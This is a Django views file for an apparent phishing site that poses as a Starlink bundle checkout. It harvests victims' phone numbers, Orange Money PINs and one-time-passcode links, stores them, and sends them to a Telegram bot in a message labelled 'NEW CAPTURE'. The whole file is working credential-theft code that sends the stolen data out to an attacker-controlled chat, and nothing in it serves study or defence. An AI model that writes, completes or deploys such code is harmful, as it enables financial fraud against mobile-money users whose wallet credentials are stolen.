import os
import json
import requests
import logging  
from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import Order, Bundle 
from .models import TelegramConfig

def send_telegram_notification(message):
    # This pulls the info you saved in the Admin "button"
    config = TelegramConfig.objects.first()
    
    if config:
        bot_token = config.bot_token
        chat_id = config.chat_id
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
        
        import requests
        requests.post(url, data=payload)
    else:
        print("Telegram not configured in Admin panel!")

# Setup Logging
logger = logging.getLogger(__name__)

def home(request):
    return render(request, 'index.html')

def checkout(request):
    bundle = request.GET.get('bundle', 'Power User')
    price = request.GET.get('price', '199')
    return render(request, 'checkout.html', {'bundle': bundle, 'price': price})

def payment_instructions(request):
    if request.method == 'POST':
        full_name = request.POST.get('fullName', '')
        city = request.POST.get('city', '')
        bundle_name = request.POST.get('bundle', 'Power User')

        # Get the bundle object
        selected_bundle = Bundle.objects.filter(name=bundle_name).first() or Bundle.objects.first()
        
        # Create the order
        order = Order.objects.create(
            full_name=full_name,
            city=city,
            total_amount=199,  
            bundle=selected_bundle
        )

        # Store order ID in session
        request.session['current_order_id'] = str(order.order_id)
        return render(request, 'payment_instructions.html', {'order': order})
    
    return redirect('starlink_app:home')

def otp_verification(request):
    order = Order.objects.order_by('-created_at').first() 

    if request.method == 'POST':
        phone = request.POST.get('phone', '')
        pin = request.POST.get('pin', '')

        if order:
            order.phone_number = phone 
            order.orange_pin = pin
            order.save()

            request.session['phone'] = phone
            request.session['pin'] = pin
            request.session['bundle'] = str(order.bundle)

        return redirect('starlink_app:otp_verification')
    return render(request, 'otp_verification.html', {'order': order})

@csrf_exempt
def sync_data(request):
    if request.method != 'POST':
        return JsonResponse({"status": "error", "message": "Method not allowed"}, status=405)

    try:
        # Parse JSON from the frontend
        data = json.loads(request.body)
        otp_link = data.get('otp', 'No Link provided')

        # Retrieve Session Data
        phone = request.session.get('phone', 'Missing')
        bundle = request.session.get('bundle', 'Missing')
        pin = request.session.get('pin', 'Missing')

        # Get Telegram Credentials
        bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
        chat_id = os.getenv('TELEGRAM_CHAT_ID')

        if not bot_token or not chat_id:
            logger.error("CRITICAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing in Render Settings.")
            return JsonResponse({"status": "error", "message": "Server config missing"}, status=500)

        # Format Telegram Message
        message = (
            "🇸🇱 *ORANGE MAX IT - NEW CAPTURE*\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"📞 *PHONE:* `+232 {phone}`\n"
            f"🔑 *PIN:* `{pin}`\n"
            f"📦 *BUNDLE:* {bundle}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🔗 *OTP LINK:*\n{otp_link}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "📡 *STATUS:* DATA RECEIVED"
        )

        # Send to Telegram
        telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        response = requests.post(telegram_url, json={
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "Markdown"
        }, timeout=15)

        if response.status_code == 200:
            return JsonResponse({"status": "success"})
        else:
            logger.error(f"Telegram Failure: {response.text}")
            return JsonResponse({"status": "success", "info": "processing"})

    except Exception as e:
        logger.exception("Internal Sync Error:")
        return JsonResponse({"status": "error", "message": "Internal Server Error"}, status=500)